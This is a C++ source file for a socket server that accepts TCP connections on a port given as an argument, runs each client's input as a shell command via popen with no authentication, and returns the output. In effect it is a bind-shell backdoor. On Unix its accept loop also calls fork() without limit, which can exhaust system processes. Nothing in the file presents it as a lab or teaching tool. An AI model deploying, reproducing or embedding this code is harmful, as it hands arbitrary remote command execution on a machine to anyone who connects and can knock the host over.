#include <string>
#include <valarray>
#include <regex>
#include <list>
#include <thread>
#include <cctype>
#include <sstream>
#include <map>
#include <iostream>

#ifdef _MSC_VER

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <tchar.h>
#include <strsafe.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "User32.lib")

#else

#include <arpa/inet.h>
#include <dirent.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <err.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <csignal>

#endif


#pragma region Server

#include <cstdio>
#include <string>
#include <functional>

#if (defined _WIN32 || _WIN64)
#define windows
#endif

class Server
{
public:
    using SocketType =
#ifdef windows
        SOCKET;
#else
        int;
#endif

    template <typename T>
    struct Option
    {
        enum class Status { Some, None };
        Status status;
        T value{};
        Option() :status(Status::None) { }
        Option(T value) :status(Status::Some), value(value) { }
        operator Status() { return status; }
        operator T() { return value; }
    };

    using MessageString = const std::string;
    using Result = const Option<const std::string>;

    static const Result::Status Succeeded = Result::Status::None;
    static const Result::Status Failed = Result::Status::Some;

    class Client
    {
    public:
        SocketType socket{};
        sockaddr_in address{};
#ifdef windows
        int
#else
        unsigned
#endif
            addrLen = sizeof address;

        Option<const int> Recv(char* buf, const uint64_t bufSize)
        {
            int len;
            if ((len = recv(socket, buf, bufSize, 0)) < 0)
            {
                return {};
            }
            return { len };
        }

        Option<const int> Send(const char* buf, const uint64_t bufSize)
        {
            int len;
            if ((len = send(socket, buf, bufSize, 0)) < 0)
            {
                return {};
            }
            return { len };
        }

    	void SendAll(const std::string& str)
        {
            auto len = str.length();
            for (decltype(len) sent = 0; sent < len; sent+=4096)
            {
                auto toSend = str.substr(sent, 4096);
                Send(toSend.c_str(), toSend.length());
            }
        }

        std::string RecvAll()
        {
            const auto bufSize = 4096;
            char buf[bufSize] = { 0 };
            std::ostringstream oss{};
            while (true)
            {
                const auto res = Recv(buf, bufSize);
                if (res.status == decltype(res)::Status::Some)
                {
                    oss.write(buf, res.value);
                    if (res.value < bufSize)
                    {
                        break;
                    }
                }
                else
                {
                    break;
                }
            }
            return oss.str();
        }

        Result Close()
        {
#ifdef windows
#define close closesocket
#endif
            close(socket);
            return {};
        }
    };

    using ClientOption = Option<Client>;

    static const ClientOption::Status ClientSucceeded = ClientOption::Status::Some;
    static const ClientOption::Status ClientFailed = ClientOption::Status::None;

    const int Port;
    SocketType serverSocket{};

    Server(const int port) :Port(port)
    {
        serverSockAddr.sin_family = AF_INET;
        serverSockAddr.sin_addr.s_addr = INADDR_ANY;
        serverSockAddr.sin_port = htons(port);
    }

    Result Init()
    {
#ifdef windows
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) < 0)
            return { "WinSock init fail" };
#else
        struct sigaction action;
        action.sa_handler = [](int) {};
        sigemptyset(&action.sa_mask);
        action.sa_flags = 0;
        sigaction(SIGPIPE, &action, nullptr);
#endif
        serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (serverSocket <= 0)
            return { "Can't open socket" };
        setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR, optVal, sizeof optVal);
        return {};
    }

    Result Bind()
    {
        if (bind(serverSocket, (struct sockaddr*) & serverSockAddr, sizeof serverSockAddr) < 0)
        {
            return { "Can't bind" };
        }
        return {};
    }

    Result Listen() const
    {
        listen(serverSocket, 100);
        return {};
    }

    Option<Client> Accept() const
    {
        Client client{};
        client.socket = accept(serverSocket, (struct sockaddr*) & client.address, &client.addrLen);
        if (client.socket <= 0)
            return {};
        return { client };
    }

    Result Close() const
    {
#ifdef windows
#define close closesocket
#endif
        close(serverSocket);
        return {};
    }
private:
    const socklen_t sockAddrLen = sizeof(sockaddr_in);

    sockaddr_in serverSockAddr{};
    char optVal[4] = { 0 };
};


#pragma endregion Server

#pragma region Shell

class Shell
{
#if (defined _WIN32 || _WIN64)
#define PipeOpen _popen
#define PipeClose _pclose
#else
#define PipeOpen popen
#define PipeClose pclose
#endif
    FILE* shell = nullptr;
public:
    Shell() = default;

    void Init(const std::string& cmd)
    {
        shell = PipeOpen(cmd.c_str(), "r");
    }

    auto Read(char* buf, int bufSize) const
    {
        return fread(buf, sizeof(char), bufSize, shell);
    }

	std::string ReadAll() const
	{
        std::ostringstream oss{};
        const auto bufSize = 4096;
        char buf[bufSize] = { 0 };
        while (true)
        {
	        const auto len = Read(buf, bufSize);
            oss.write(buf, len);
	        if (len < bufSize)
	        {
                break;
	        }
        }
        return oss.str();
    }

    void Write(const char* buf, int bufSize) const
    {
        fwrite(buf, sizeof(char), bufSize, shell);
    }

    void Close() const
    {
        PipeClose(shell);
    }
};

#pragma endregion Shell

void Fuck(Server::Client client)
{
    Shell shell{};
    auto input = client.RecvAll();
    shell.Init(input.substr(0, input.length() - 2));
    //while (true)
    {
        //const auto bufSize = 4096;
        //char buf[bufSize];
        //shell.Read(buf, bufSize);

        const auto echo = shell.ReadAll();
        client.SendAll(echo);
        //puts(echo.c_str());
        client.Close();
    }
}

template<typename In = std::string, typename Out = int>
[[nodiscard]] Out Convert(const In& value)
{
    int res;
    std::istringstream(value) >> res;
    return res;
}

int main(const int argc, char* argv[])
{
	while (true)
	{
		try
		{
			Server server(Convert(argv[1]));
			server.Init();
			server.Bind();
			server.Listen();
			while (true)
			{
#ifndef windows
                fork();
#endif
				try
				{
					auto client = server.Accept();
					if (client.status == Server::ClientSucceeded)
					{
						Fuck(client.value);
					}
				}
				catch (...)
				{
				}
			}
		}
		catch (...)
		{
		}
	}
}
